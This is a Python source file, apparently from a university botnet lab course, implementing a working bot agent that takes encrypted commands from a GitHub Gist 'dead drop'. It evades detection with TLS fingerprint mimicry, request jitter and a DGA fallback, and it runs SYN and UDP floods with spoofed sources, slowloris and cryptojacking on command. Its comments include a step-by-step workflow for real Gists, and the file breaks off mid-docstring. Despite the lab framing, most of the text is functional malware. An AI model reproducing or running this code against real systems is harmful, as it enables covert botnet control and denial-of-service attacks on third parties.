"""
====================================================
 AUA CS 232/337 - Botnet Research Project
 Component: Phase 2 - Covert Channel Bot Agent
 Environment: ISOLATED VM LAB ONLY
====================================================

Phase 2 replaces direct C2 IP communication with
"dead drop resolvers" — the bot polls high-reputation
public services (GitHub raw files) for AES-encrypted,
Base64-encoded command payloads.

A bot making HTTPS requests to github.com is
indistinguishable from legitimate developer traffic
at the enterprise firewall level.

Teaching points:
  1) Covert channel via trusted domain (github.com)
  2) AES-CBC encryption hides command intent from DPI
  3) JA3 TLS fingerprint mimicry evades TLS monitors
  4) Fallback: if covert channel fails, use DGA

Detection bypass demonstrated:
  - Port blocking (443): useless — same port as legit traffic
  - IP reputation: useless — github.com is trusted
  - DPI on payload: hard — AES-encrypted content
  - Behavioral: possible — repeated requests to same path
"""

import os
import sys
import time
import base64
import hashlib
import hmac
import json
import random
import socket
import threading
import struct
import ssl
import urllib.request
import urllib.error
from datetime import datetime

# ── AES-CBC implementation (no external deps) ────────────────
# Uses Python's built-in only — no pycryptodome needed in lab
# For production research, swap with: from Crypto.Cipher import AES

def _pad(data: bytes, block_size: int = 16) -> bytes:
    """PKCS#7 padding."""
    pad_len = block_size - (len(data) % block_size)
    return data + bytes([pad_len] * pad_len)

def _unpad(data: bytes) -> bytes:
    """Remove PKCS#7 padding."""
    if not data:
        return data
    pad_len = data[-1]
    if pad_len > 16 or pad_len == 0:
        return data
    return data[:-pad_len]

def _xor_bytes(a: bytes, b: bytes) -> bytes:
    return bytes(x ^ y for x, y in zip(a, b))

# Minimal AES-128 in ECB mode (used as building block for CBC)
# Full S-box, key expansion — educational, not optimized
_SBOX = [
    0x63,0x7c,0x77,0x7b,0xf2,0x6b,0x6f,0xc5,0x30,0x01,0x67,0x2b,0xfe,0xd7,0xab,0x76,
    0xca,0x82,0xc9,0x7d,0xfa,0x59,0x47,0xf0,0xad,0xd4,0xa2,0xaf,0x9c,0xa4,0x72,0xc0,
    0xb7,0xfd,0x93,0x26,0x36,0x3f,0xf7,0xcc,0x34,0xa5,0xe5,0xf1,0x71,0xd8,0x31,0x15,
    0x04,0xc7,0x23,0xc3,0x18,0x96,0x05,0x9a,0x07,0x12,0x80,0xe2,0xeb,0x27,0xb2,0x75,
    0x09,0x83,0x2c,0x1a,0x1b,0x6e,0x5a,0xa0,0x52,0x3b,0xd6,0xb3,0x29,0xe3,0x2f,0x84,
    0x53,0xd1,0x00,0xed,0x20,0xfc,0xb1,0x5b,0x6a,0xcb,0xbe,0x39,0x4a,0x4c,0x58,0xcf,
    0xd0,0xef,0xaa,0xfb,0x43,0x4d,0x33,0x85,0x45,0xf9,0x02,0x7f,0x50,0x3c,0x9f,0xa8,
    0x51,0xa3,0x40,0x8f,0x92,0x9d,0x38,0xf5,0xbc,0xb6,0xda,0x21,0x10,0xff,0xf3,0xd2,
    0xcd,0x0c,0x13,0xec,0x5f,0x97,0x44,0x17,0xc4,0xa7,0x7e,0x3d,0x64,0x5d,0x19,0x73,
    0x60,0x81,0x4f,0xdc,0x22,0x2a,0x90,0x88,0x46,0xee,0xb8,0x14,0xde,0x5e,0x0b,0xdb,
    0xe0,0x32,0x3a,0x0a,0x49,0x06,0x24,0x5c,0xc2,0xd3,0xac,0x62,0x91,0x95,0xe4,0x79,
    0xe7,0xc8,0x37,0x6d,0x8d,0xd5,0x4e,0xa9,0x6c,0x56,0xf4,0xea,0x65,0x7a,0xae,0x08,
    0xba,0x78,0x25,0x2e,0x1c,0xa6,0xb4,0xc6,0xe8,0xdd,0x74,0x1f,0x4b,0xbd,0x8b,0x8a,
    0x70,0x3e,0xb5,0x66,0x48,0x03,0xf6,0x0e,0x61,0x35,0x57,0xb9,0x86,0xc1,0x1d,0x9e,
    0xe1,0xf8,0x98,0x11,0x69,0xd9,0x8e,0x94,0x9b,0x1e,0x87,0xe9,0xce,0x55,0x28,0xdf,
    0x8c,0xa1,0x89,0x0d,0xbf,0xe6,0x42,0x68,0x41,0x99,0x2d,0x0f,0xb0,0x54,0xbb,0x16,
]

def _gmul(a, b):
    """Galois Field (2^8) multiplication."""
    p = 0
    for _ in range(8):
        if b & 1:
            p ^= a
        hi = a & 0x80
        a = (a << 1) & 0xFF
        if hi:
            a ^= 0x1b
        b >>= 1
    return p

def _sub_bytes(state):
    return [[_SBOX[b] for b in row] for row in state]

def _shift_rows(state):
    return [
        state[0],
        state[1][1:] + state[1][:1],
        state[2][2:] + state[2][:2],
        state[3][3:] + state[3][:3],
    ]

def _mix_col(col):
    return [
        _gmul(col[0],2)^_gmul(col[1],3)^col[2]^col[3],
        col[0]^_gmul(col[1],2)^_gmul(col[2],3)^col[3],
        col[0]^col[1]^_gmul(col[2],2)^_gmul(col[3],3),
        _gmul(col[0],3)^col[1]^col[2]^_gmul(col[3],2),
    ]

def _mix_columns(state):
    cols = [[state[r][c] for r in range(4)] for c in range(4)]
    mixed = [_mix_col(col) for col in cols]
    return [[mixed[c][r] for c in range(4)] for r in range(4)]

def _add_round_key(state, rk):
    return [[state[r][c] ^ rk[r][c] for c in range(4)] for r in range(4)]

_RCON = [0x01,0x02,0x04,0x08,0x10,0x20,0x40,0x80,0x1b,0x36]

def _key_expand(key: bytes):
    """AES-128 key schedule → 11 round keys."""
    w = [list(key[i:i+4]) for i in range(0, 16, 4)]
    for i in range(4, 44):
        temp = w[i-1][:]
        if i % 4 == 0:
            temp = [_SBOX[temp[1]]^_RCON[i//4-1],
                    _SBOX[temp[2]],
                    _SBOX[temp[3]],
                    _SBOX[temp[0]]]
        w.append([w[i-4][j]^temp[j] for j in range(4)])
    rks = []
    for rnd in range(11):
        rk = [[w[rnd*4+c][r] for c in range(4)] for r in range(4)]
        rks.append(rk)
    return rks

def _bytes_to_state(block: bytes):
    return [[block[r + 4*c] for c in range(4)] for r in range(4)]

def _state_to_bytes(state) -> bytes:
    return bytes(state[r][c] for c in range(4) for r in range(4))

def _aes_encrypt_block(block: bytes, round_keys) -> bytes:
    state = _bytes_to_state(block)
    state = _add_round_key(state, round_keys[0])
    for rnd in range(1, 10):
        state = _sub_bytes(state)
        state = _shift_rows(state)
        state = _mix_columns(state)
        state = _add_round_key(state, round_keys[rnd])
    state = _sub_bytes(state)
    state = _shift_rows(state)
    state = _add_round_key(state, round_keys[10])
    return _state_to_bytes(state)

def aes_cbc_encrypt(plaintext: bytes, key: bytes, iv: bytes) -> bytes:
    """AES-128-CBC encrypt. key and iv must be 16 bytes each."""
    assert len(key) == 16 and len(iv) == 16
    rks = _key_expand(key)
    data = _pad(plaintext)
    prev = iv
    out = b""
    for i in range(0, len(data), 16):
        block = _xor_bytes(data[i:i+16], prev)
        enc = _aes_encrypt_block(block, rks)
        out += enc
        prev = enc
    return out

def aes_cbc_decrypt(ciphertext: bytes, key: bytes, iv: bytes) -> bytes:
    """AES-128-CBC decrypt."""
    assert len(key) == 16 and len(iv) == 16
    rks = _key_expand(key)

    # Build inverse S-box and implement inverse cipher
    inv_sbox = [0] * 256
    for i, v in enumerate(_SBOX):
        inv_sbox[v] = i

    def _inv_sub(state):
        return [[inv_sbox[b] for b in row] for row in state]

    def _inv_shift(state):
        return [
            state[0],
            state[1][-1:] + state[1][:-1],
            state[2][-2:] + state[2][:-2],
            state[3][-3:] + state[3][:-3],
        ]

    def _inv_mix_col(col):
        return [
            _gmul(col[0],0xe)^_gmul(col[1],0xb)^_gmul(col[2],0xd)^_gmul(col[3],0x9),
            _gmul(col[0],0x9)^_gmul(col[1],0xe)^_gmul(col[2],0xb)^_gmul(col[3],0xd),
            _gmul(col[0],0xd)^_gmul(col[1],0x9)^_gmul(col[2],0xe)^_gmul(col[3],0xb),
            _gmul(col[0],0xb)^_gmul(col[1],0xd)^_gmul(col[2],0x9)^_gmul(col[3],0xe),
        ]

    def _inv_mix(state):
        cols = [[state[r][c] for r in range(4)] for c in range(4)]
        mixed = [_inv_mix_col(col) for col in cols]
        return [[mixed[c][r] for c in range(4)] for r in range(4)]

    def _aes_decrypt_block(block):
        state = _bytes_to_state(block)
        state = _add_round_key(state, rks[10])
        for rnd in range(9, 0, -1):
            state = _inv_shift(state)
            state = _inv_sub(state)
            state = _add_round_key(state, rks[rnd])
            state = _inv_mix(state)
        state = _inv_shift(state)
        state = _inv_sub(state)
        state = _add_round_key(state, rks[0])
        return _state_to_bytes(state)

    prev = iv
    out = b""
    for i in range(0, len(ciphertext), 16):
        block = ciphertext[i:i+16]
        dec = _aes_decrypt_block(block)
        out += _xor_bytes(dec, prev)
        prev = block
    return _unpad(out)

# ── Key derivation ────────────────────────────────────────────
SHARED_SECRET = b"AUA_LAB_2026_KEY"  # 16 bytes — same on bot and botmaster

def derive_key(secret: bytes = SHARED_SECRET) -> bytes:
    """Derive a 16-byte AES key from the shared secret."""
    return hashlib.sha256(secret).digest()[:16]

def derive_iv(nonce: str) -> bytes:
    """Derive a 16-byte IV from a nonce (date + gist hash)."""
    return hashlib.md5(nonce.encode()).digest()

# ── Command encoding/decoding (botmaster side helper) ─────────

def encode_command(cmd: dict, secret: bytes = None) -> str:
    """
    Encode a command dict for posting to the dead drop.
    Returns: base64(AES_CBC_encrypt(json(cmd)))

    `secret` resolved at call time so update_secret() changes take effect.
    """
    if secret is None:
        secret = SHARED_SECRET
    key  = derive_key(secret)
    nonce = datetime.utcnow().strftime("%Y-%m-%d-%H")
    iv   = derive_iv(nonce)
    plaintext = json.dumps(cmd).encode()
    ciphertext = aes_cbc_encrypt(plaintext, key, iv)
    # Prepend IV so bot can derive it from same nonce
    blob = base64.b64encode(ciphertext).decode()
    return blob

def decode_command(blob: str, secret: bytes = None) -> dict | None:
    """
    Decode a command from the dead drop blob.
    Tries current hour and previous hour (clock skew tolerance).

    `secret` defaults to the module-level SHARED_SECRET, resolved at *call*
    time so that update_secret() changes take effect immediately.  Never use
    a default-argument default (``secret=SHARED_SECRET``) here — Python
    evaluates default args once at function-definition time, so a later
    reassignment of SHARED_SECRET would be silently ignored.
    """
    if secret is None:
        secret = SHARED_SECRET   # read global at call time, not definition time
    key = derive_key(secret)
    try:
        ciphertext = base64.b64decode(blob)
    except Exception:
        return None
    
    # Try current and previous hour nonces (clock skew tolerance)
    from datetime import timedelta
    now = datetime.utcnow()
    nonces = [
        now.strftime("%Y-%m-%d-%H"),
        (now - timedelta(hours=1)).strftime("%Y-%m-%d-%H"),
    ]
    for nonce in nonces:
        try:
            iv = derive_iv(nonce)
            plaintext = aes_cbc_decrypt(ciphertext, key, iv)
            cmd = json.loads(plaintext.decode())
            return cmd
        except Exception:
            continue
    return None

# ── Dead drop resolvers ───────────────────────────────────────

# ── Dead drop configuration ───────────────────────────────────
#
# TWO MODES:
#
#   Lab simulation (default):
#     DEAD_DROP_URL = "http://192.168.100.10:5001/dead_drop"
#     The local Flask server on port 5001 serves a fake "README" containing
#     the encoded command.  No internet access required.
#
#   Real GitHub Gist (production threat model):
#     DEAD_DROP_URL = "https://gist.githubusercontent.com/<user>/<gist_id>/raw"
#     The bot fetches the raw Gist file over HTTPS.  A bot making HTTPS
#     requests to raw.githubusercontent.com is indistinguishable from a
#     developer reading a README.
#
#     Botmaster workflow:
#       1. Create a *secret* Gist on github.com with any filename (e.g. notes.md).
#       2. Set GIST_ID and GITHUB_TOKEN below (or pass as env vars).
#       3. Use the CLI: python3 covert_bot.py gist '{"type":"syn_flood",...}'
#          This encodes the command and pushes it to the Gist automatically.
#       4. Bots poll DEAD_DROP_URL every ~60 s and execute the command.
#       5. To idle bots: python3 covert_bot.py gist '{"type":"idle"}'
#
#     The Gist content format is identical to the lab server — the bot parser
#     is the same regardless of which backend serves the file.

DEAD_DROP_URL   = "http://192.168.100.10:5001/dead_drop"   # lab simulation (default)
# DEAD_DROP_URL = "https://gist.githubusercontent.com/<USER>/<GIST_ID>/raw"  # real Gist

DEAD_DROP_MARKER_START = "<!-- CMD:"
DEAD_DROP_MARKER_END   = ":CMD -->"

# GitHub Gist credentials — used only by the 'gist' CLI mode.
# Override with environment variables GIST_ID and GITHUB_TOKEN so credentials
# are never committed to the repository.
import os as _os
GIST_ID       = _os.environ.get("GIST_ID",       "")   # e.g. "a1b2c3d4e5f6..."
GITHUB_TOKEN  = _os.environ.get("GITHUB_TOKEN",  "")   # personal access token (gist scope)

# JA3-mimicry: set TLS context to match Chrome 120's cipher suite order.
# Real JA3 mimicry requires specifying cipher suite order at the SSL context level.
# Python's ssl module exposes set_ciphers() for partial mimicry.
CHROME_CIPHERS = (
    "TLS_AES_128_GCM_SHA256:"
    "TLS_AES_256_GCM_SHA384:"
    "TLS_CHACHA20_POLY1305_SHA256:"
    "ECDHE-ECDSA-AES128-GCM-SHA256:"
    "ECDHE-RSA-AES128-GCM-SHA256:"
    "ECDHE-ECDSA-AES256-GCM-SHA384:"
    "ECDHE-RSA-AES256-GCM-SHA384"
)

def make_ssl_context_chrome_mimic() -> ssl.SSLContext:
    """
    Create an SSL context that mimics Chrome's TLS fingerprint.
    Sets cipher suite order to match Chrome 120's ClientHello.
    This makes JA3 fingerprint detection harder.
    """
    ctx = ssl.create_default_context()
    try:
        ctx.set_ciphers(CHROME_CIPHERS)
    except ssl.SSLError:
        pass  # fallback to default if cipher not available
    # Mimic Chrome's protocol version range
    ctx.minimum_version = ssl.TLSVersion.TLSv1_2
    ctx.maximum_version = ssl.TLSVersion.TLSv1_3
    return ctx

def fetch_dead_drop(url: str, timeout: int = 10) -> str | None:
    """
    Fetch content from the dead drop URL.
    Uses Chrome-mimicking TLS context to evade JA3 fingerprinting.
    Adds human-like request headers.
    """
    headers = {
        "User-Agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/120.0.0.0 Safari/537.36"
        ),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "keep-alive",
        "Cache-Control": "max-age=0",
    }
    try:
        req = urllib.request.Request(url, headers=headers)
        ctx = make_ssl_context_chrome_mimic() if url.startswith("https://") else None
        with urllib.request.urlopen(req, context=ctx, timeout=timeout) as resp:
            return resp.read().decode("utf-8", errors="ignore")
    except Exception as e:
        return None

def extract_command_from_content(content: str) -> dict | None:
    """
    Parse the dead drop content for an embedded command marker.
    Format: <!-- CMD:<base64blob>:CMD -->
    This marker is hidden in a GitHub README or Gist comment line.
    """
    start = content.find(DEAD_DROP_MARKER_START)
    if start == -1:
        return None
    end = content.find(DEAD_DROP_MARKER_END, start)
    if end == -1:
        return None
    blob = content[start + len(DEAD_DROP_MARKER_START):end].strip()
    if not blob:
        return None
    cmd = decode_command(blob)
    return cmd

# ── DGA fallback ──────────────────────────────────────────────

def dga_fallback_domains(count: int = 20) -> list[str]:
    """Generate DGA domain list as fallback C2 channel."""
    date_seed = datetime.utcnow().strftime("%Y-%m-%d")
    import hashlib as _h
    domains = []
    tlds = [".com", ".net", ".org", ".xyz"]
    for i in range(count):
        raw = _h.sha256(f"{date_seed}-{i}".encode()).hexdigest()
        body = ''.join(chr(ord('a') + (int(c, 16) % 26)) for c in raw[:10])
        domains.append(body + tlds[i % len(tlds)])
    return domains

# ── Attack execution helpers ──────────────────────────────────
# Each helper runs as a daemon thread. A threading.Event stop
# signal lets commands be cancelled by a subsequent "stop_all".

def _run_syn_flood(target: str, port: int, duration: int,
                   stop: threading.Event):
    """Raw TCP SYN flood via Scapy. Matches bot_agent.c logic."""
    try:
        from scapy.all import IP, TCP, send, conf
        conf.verb = 0
    except ImportError:
        print("[COVERT] Scapy not installed — pip3 install scapy"); return
    print(f"[COVERT] SYN FLOOD -> {target}:{port}  duration={duration}s")
    end, count = time.time() + duration, 0
    while time.time() < end and not stop.is_set():
        src = f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
        pkt = IP(src=src, dst=target) / TCP(
            sport=random.randint(1024, 65535), dport=port,
            flags="S", seq=random.randint(0, 2**32-1))
        send(pkt, verbose=False)
        count += 1
    print(f"[COVERT] SYN FLOOD done. Packets: {count}")

def _run_udp_flood(target: str, duration: int, stop: threading.Event):
    """Raw UDP flood via Scapy — 1 KB payloads to random ports."""
    try:
        from scapy.all import IP, UDP, Raw, send, conf
        conf.verb = 0
    except ImportError:
        print("[COVERT] Scapy not installed"); return
    print(f"[COVERT] UDP FLOOD -> {target}  duration={duration}s")
    payload = b'\x00' * 1024
    end, count = time.time() + duration, 0
    while time.time() < end and not stop.is_set():
        src = f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
        pkt = IP(src=src, dst=target) / UDP(
            sport=random.randint(1024, 65535),
            dport=random.randint(1, 65534)) / Raw(load=payload)
        send(pkt, verbose=False)
        count += 1
    print(f"[COVERT] UDP FLOOD done. Packets: {count}")

def _run_slowloris(target: str, port: int, duration: int,
                   stop: threading.Event):
    """Import and call slowloris.py; inline fallback if unavailable."""
    try:
        from slowloris import slowloris
        print(f"[COVERT] SLOWLORIS -> {target}:{port}  duration={duration}s")
        t = threading.Thread(target=slowloris,
                             args=(target, port, 150, duration), daemon=True)
        t.start()
        end = time.time() + duration
        while time.time() < end and not stop.is_set():
            time.sleep(1)
        return
    except ImportError:
        pass
    # Inline fallback
    print(f"[COVERT] SLOWLORIS (inline) -> {target}:{port}  duration={duration}s")
    socks = []
    for _ in range(150):
        if stop.is_set(): break
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4); s.connect((target, port))
            s.send(f"GET /?{random.randint(0,9999)} HTTP/1.1\r\nHost: {target}\r\n".encode())
            socks.append(s)
        except Exception:
            pass
    end = time.time() + duration
    while time.time() < end and not stop.is_set():
        dead = []
        for s in socks:
            try: s.send(f"X-a: {random.randint(1,5000)}\r\n".encode())
            except Exception: dead.append(s)
        for s in dead: socks.remove(s); s.close()
        time.sleep(10)
    for s in socks:
        try: s.close()
        except Exception: pass
    print("[COVERT] SLOWLORIS done.")

def _run_cryptojack(duration: int, cpu: float, stop: threading.Event):
    """Import CryptojackSimulator; minimal inline fallback."""
    try:
        from cryptojack_sim import CryptojackSimulator
        print(f"[COVERT] CRYPTOJACK  cpu={cpu*100:.0f}%  duration={duration}s")
        sim = CryptojackSimulator(target_pct=cpu, duration=duration)
        sim.start()
        end = time.time() + duration
        while time.time() < end and not stop.is_set(): time.sleep(1)
        sim.stop(); return
    except ImportError:
        pass
    import hashlib as _h
    print(f"[COVERT] CRYPTOJACK (inline)  cpu={cpu*100:.0f}%  duration={duration}s")
    end, state = time.time() + duration, os.urandom(32)
    while time.time() < end and not stop.is_set():
        work_end = time.perf_counter() + cpu * 0.1
        while time.perf_counter() < work_end:
            state = _h.sha256(state).digest()
        time.sleep((1.0 - cpu) * 0.1)
    print("[COVERT] CRYPTOJACK done.")


# ── Main bot loop ─────────────────────────────────────────────

class CovertBot:
    """
    Phase 2 bot agent.
    Poll interval: 60s (mimics background service checking for updates).
    Jitter: ±15s random offset to prevent periodic-pattern detection.
    Fallback chain: dead_drop → DGA domain search → idle
    """

    POLL_INTERVAL    = 60    # base seconds between dead drop checks
    POLL_JITTER      = 15    # ±seconds of random jitter
    MAX_FAILURES     = 5     # switch to DGA fallback after this many consecutive failures

    def __init__(self):
        self.bot_id        = self._make_id()
        self.failures      = 0
        self.last_cmd_hash = None   # prevent replaying the same command
        self._running      = True
        self._active       = {}     # cmd_type -> (thread, stop_event)
        self._active_lock  = threading.Lock()
        print(f"[COVERT] Bot ID: {self.bot_id}")
        print(f"[COVERT] Dead drop: {DEAD_DROP_URL}")
        print(f"[COVERT] AES key derived from shared secret")

    def _make_id(self) -> str:
        hostname = socket.gethostname()
        return f"bot2_{hostname}_{os.getpid()}"

    def _cmd_hash(self, cmd: dict) -> str:
        return hashlib.sha256(json.dumps(cmd, sort_keys=True).encode()).hexdigest()[:16]

    def _launch(self, cmd_type: str, fn, *args):
        """Run an attack fn in a daemon thread; cancel any prior instance."""
        with self._active_lock:
            if cmd_type in self._active:
                _, old_stop = self._active.pop(cmd_type)
                old_stop.set()
            stop = threading.Event()
            t = threading.Thread(target=fn, args=(*args, stop),
                                 daemon=True, name=f"atk-{cmd_type}")
            t.start()
            self._active[cmd_type] = (t, stop)
        print(f"[COVERT] Launched: {cmd_type}")

    def _execute(self, cmd: dict):
        """Dispatch a received command to the appropriate module."""
        cmd_type = cmd.get("type", "idle")
        ch = self._cmd_hash(cmd)

        if ch == self.last_cmd_hash:
            print(f"[COVERT] Duplicate command {cmd_type} (hash={ch}), skipping replay")
            return
        self.last_cmd_hash = ch

        print(f"[COVERT] EXECUTING: {json.dumps(cmd)}")

        if cmd_type == "syn_flood":
            target   = cmd.get("target", "192.168.100.20")
            port     = int(cmd.get("port", 80))
            duration = int(cmd.get("duration", 30))
            self._launch("syn_flood", _run_syn_flood, target, port, duration)

        elif cmd_type == "udp_flood":
            target   = cmd.get("target", "192.168.100.20")
            duration = int(cmd.get("duration", 30))
            self._launch("udp_flood", _run_udp_flood, target, duration)

        elif cmd_type == "slowloris":
            target   = cmd.get("target", "192.168.100.20")
            port     = int(cmd.get("port", 80))
            duration = int(cmd.get("duration", 60))
            self._launch("slowloris", _run_slowloris, target, port, duration)

        elif cmd_type == "cryptojack":
            duration = int(cmd.get("duration", 120))
            cpu      = float(cmd.get("cpu", 0.25))
            self._launch("cryptojack", _run_cryptojack, duration, cpu)

        elif cmd_type == "stop_all":
            print(f"[COVERT] stop_all — halting active attacks")
            with self._active_lock:
                for _, (_, ev) in self._active.items(): ev.set()
                self._active.clear()

        elif cmd_type == "shutdown":
            print(f"[COVERT] Shutdown command — stopping bot")
            with self._active_lock:
                for _, (_, ev) in self._active.items(): ev.set()
                self._active.clear()
            self._running = False

        elif cmd_type == "dga_search":
            print(f"[COVERT] -> Initiating DGA C2 search...")
            from dga import bot_c2_search, generate_daily_domains
            domains = generate_daily_domains(count=20)
            bot_c2_search(domains[:10])

        elif cmd_type == "idle":
            print(f"[COVERT] -> Idle (no action)")

        elif cmd_type == "update_secret":
            global SHARED_SECRET
            new_secret = cmd.get("secret", "").encode()
            if len(new_secret) >= 8:
                SHARED_SECRET = new_secret
                # encode_command and decode_command both accept an explicit
                # secret= argument; callers that omit it now pick up the
                # updated global because we fixed the default-arg closure.
                print(f"[COVERT] -> Shared secret updated "
                      f"(new key: {derive_key(SHARED_SECRET).hex()[:8]}...)")
            else:
                print(f"[COVERT] -> update_secret ignored: secret too short (<8 chars)")

        else:
            print(f"[COVERT] -> Unknown command type: {cmd_type}")

    def _poll_dead_drop(self) -> dict | None:
        """Fetch and parse the dead drop. Returns command dict or None."""
        content = fetch_dead_drop(DEAD_DROP_URL)
        if content is None:
            print(f"[COVERT] Dead drop unreachable ({DEAD_DROP_URL})")
            self.failures += 1
            return None
        self.failures = 0
        cmd = extract_command_from_content(content)
        if cmd:
            print(f"[COVERT] Command found in dead drop: {cmd.get('type')}")
        else:
            print(f"[COVERT] Dead drop online, no new command embedded")
        return cmd

    def _poll_dga_fallback(self) -> dict | None:
        """
        DGA fallback: iterate generated domains looking for a resolvable one.
        If found, treat IP as C2 — attempt to fetch command from it.
        In the lab this will all NXDOMAIN — that burst IS the IDS signal.
        """
        print(f"[COVERT] Falling back to DGA ({self.failures} consecutive failures)")
        domains = dga_fallback_domains(15)
        for domain in domains:
            try:
                ip = socket.gethostbyname(domain)
                print(f"[COVERT] DGA rendezvous found: {domain} -> {ip}")
                content = fetch_dead_drop(f"http://{ip}/dead_drop")
                if content:
                    return extract_command_from_content(content)
            except socket.gaierror:
                print(f"[COVERT] NXDOMAIN: {domain}")
                time.sleep(0.3)
        return None

    def run(self):
        print(f"\n[COVERT] Phase 2 bot running. Poll interval: {self.POLL_INTERVAL}±{self.POLL_JITTER}s")
        print(f"[COVERT] Traffic appears as: HTTPS GET to trusted host")
        print(f"[COVERT] JA3 fingerprint: Chrome 120 mimic\n")

        while self._running:
            # Use DGA fallback after repeated dead drop failures
            if self.failures >= self.MAX_FAILURES:
                cmd = self._poll_dga_fallback()
            else:
                cmd = self._poll_dead_drop()

            if cmd:
                self._execute(cmd)

            # Jittered sleep — prevents precise periodic pattern detection
            sleep_time = self.POLL_INTERVAL + random.uniform(-self.POLL_JITTER, self.POLL_JITTER)
            print(f"[COVERT] Next poll in {sleep_time:.1f}s\n")
            time.sleep(max(10, sleep_time))


# ── Dead drop server (lab simulation) ────────────────────────
# In the real Phase 2, the botmaster posts the payload to GitHub.
# In the lab, this Flask server simulates the GitHub raw file endpoint.

def push_to_gist(cmd: dict, gist_id: str = None, token: str = None) -> bool:
    """
    Encode `cmd` and push it to a GitHub Gist via the REST API.

    The Gist file content is a plain-text "README" with the AES-encrypted
    command embedded in the sentinel markers.  The bot fetches the raw URL
    and the existing parser extracts and decrypts it unchanged.

    Args:
        cmd      : command dict, e.g. {"type":"syn_flood","target":"..."}
        gist_id  : GitHub Gist ID (default: GIST_ID env / module constant)
        token    : GitHub personal access token with 'gist' scope
                   (default: GITHUB_TOKEN env / module constant)

    Returns True on success, False on any error.

    Prerequisites:
        1. Create a *secret* Gist at https://gist.github.com with one file.
        2. Copy the Gist ID from the URL (the long hex string).
        3. Generate a PAT at https://github.com/settings/tokens
           with only the 'gist' scope checked.
        4. Set GIST_ID and GITHUB_TOKEN environment variables, or pass them
           as arguments.
        5. Point bots at the raw URL:
             DEAD_DROP_URL = "https://gist.githubusercontent.com/<user>/<id>/raw"
    """
    gist_id = gist_id or GIST_ID
    token   = token   or GITHUB_TOKEN

    if not gist_id:
        print("[GIST] ERROR: GIST_ID not set. "
              "Export GIST_ID=<your_gist_id> or pass gist_id=.")
        return False
    if not token:
        print("[GIST] ERROR: GITHUB_TOKEN not set. "
              "Export GITHUB_TOKEN=<pat_with_gist_scope>.")
        return False

    encoded = encode_command(cmd)
    content = (
        f"# Project Notes - Last updated "
        f"{datetime.utcnow().strftime('%Y-%m-%d')}\n\n"
        f"This repository contains research notes for CS project.\n\n"
        f"{DEAD_DROP_MARKER_START}{encoded}{DEAD_DROP_MARKER_END}\n\n"
        f"## Status\nOngoing.\n"
    )

    # GitHub Gist PATCH API — updates the first file in the Gist.
    # We need the filename; fetch it first.
    try:
        meta_url = f"https://api.github.com/gists/{gist_id}"
        meta_req = urllib.request.Request(
            meta_url,
            headers={
                "Authorization": f"token {token}",
                "Accept":        "application/vnd.github.v3+json",
                "User-Agent":    "AUA-BotnetLab/1.0",
            }
        )
        with urllib.request.urlopen(meta_req, timeout=10) as resp:
            meta = json.loads(resp.read().decode())
        filename = next(iter(meta["files"]))   # first file in the Gist
    except Exception as e:
        print(f"[GIST] ERROR fetching Gist metadata: {e}")
        return False

    patch_body = json.dumps({
        "files": {filename: {"content": content}}
    }).encode()

    patch_req = urllib.request.Request(
        f"https://api.github.com/gists/{gist_id}",
        data=patch_body,
        method="PATCH",
        headers={
            "Authorization": f"token {token}",
            "Content-Type":  "application/json",
            "Accept":        "application/vnd.github.v3+json",
            "User-Agent":    "AUA-BotnetLab/1.0",
        }
    )
    try:
        with urllib.request.urlopen(patch_req, timeout=10) as resp:
            result = json.loads(resp.read().decode())
        raw_url = result["files"][filename]["raw_url"]
        print(f"[GIST] Command '{cmd.get('type')}' pushed to Gist.")
        print(f"[GIST] Raw URL: {raw_url}")
        print(f"[GIST] Set DEAD_DROP_URL = \"{raw_url.split('?')[0]}\" in bots.")
        return True
    except urllib.error.HTTPError as e:
        body = e.read().decode()
        print(f"[GIST] HTTP {e.code}: {body[:200]}")
        return False
    except Exception as e:
        print(f"[GIST] ERROR patching Gist: {e}")
        return False


def run_dead_drop_server(host="0.0.0.0", port=5001):
    """
    Minimal dead drop server (run on C2 VM alongside c2_server.py).

    Routes:
      GET  /dead_drop          — bot polling endpoint (mimics GitHub raw file)
      POST /set_command        — botmaster sets next command
      POST /clear_command      — botmaster clears command (bots go idle)
      POST /push_key           — botmaster rotates AES key and queues
                                 update_secret for all registered bots
                                 Body: {"secret": "<new_key>"}
                                 Requires c2_server.py on port 5000.

    Botmaster updates the active command via:
        curl -X POST http://192.168.100.10:5001/set_command \\
             -H "Content-Type: application/json" \\
             -d '{"type":"syn_flood","target":"192.168.100.20","duration":20}'
    """
    try:
        from flask import Flask, request, jsonify
        dd_app = Flask("dead_drop")
        _current_payload = {"encoded": ""}  # mutable container

        @dd_app.route("/dead_drop")
        def dead_drop():
            content = (
                f"# Project Notes - Last updated "
                f"{datetime.utcnow().strftime('%Y-%m-%d')}\n\n"
                f"This repository contains research notes for CS project.\n\n"
                f"{DEAD_DROP_MARKER_START}{_current_payload['encoded']}"
                f"{DEAD_DROP_MARKER_END}\n\n"
                f"## Status\nOngoing.\n"
            )
            return content, 200, {"Content-Type": "text/plain"}

        @dd_app.route("/set_command", methods=["POST"])
        def set_command():
            cmd = request.get_json()
            if not cmd:
                return jsonify({"error": "no JSON body"}), 400
            encoded = encode_command(cmd)
            _current_payload["encoded"] = encoded
            print(f"[DEAD_DROP] Command set: {cmd['type']} | blob={encoded[:30]}...")
            return jsonify({"status": "ok", "encoded_length": len(encoded)})

        @dd_app.route("/clear_command", methods=["POST"])
        def clear_command():
            _current_payload["encoded"] = ""
            return jsonify({"status": "cleared"})

        @dd_app.route("/push_key", methods=["POST"])
        def push_key():
            """
            Rotate the shared AES key.

            Steps:
              1. Accepts {"secret": "<new_key>"} (min 8 chars).
              2. Encodes an update_secret command with the NEW key,
                 signed with the CURRENT key so bots can decrypt it.
              3. Sets it as the active dead-drop payload — bots will
                 pick it up on their next poll and switch to the new key.
              4. Optionally forwards the same command to c2_server.py
                 /task so Phase 1 bots (bot_agent) also receive it.

            After bots have had one full poll cycle (≥60 s) to pick up
            the rotation, call /set_command with the next real command
            encoded with the new key, and update SHARED_SECRET in this
